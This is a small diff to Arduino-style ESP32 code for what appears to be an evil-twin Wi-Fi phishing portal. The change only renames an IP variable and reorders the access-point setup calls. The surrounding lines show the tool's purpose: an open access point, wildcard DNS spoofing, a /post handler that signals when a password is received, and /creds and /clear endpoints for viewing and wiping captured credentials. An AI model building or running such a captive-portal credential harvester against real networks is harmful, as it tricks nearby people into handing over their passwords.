@@ -14,8 +14,7 @@
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(192, 168, 4, 1);
-
+IPAddress apIP(192, 168, 4, 1);
 String Credentials="";
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; WebServer webServer(80);
@@ -85,9 +84,9 @@ void BLINK() { // The internal LED will blink 5 times when a password is receive
 void setup() {
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
-  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
-  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  dnsServer.start(DNS_PORT, "*", apIP); // DNS spoofing (Only HTTP)
   webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
   webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
   webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
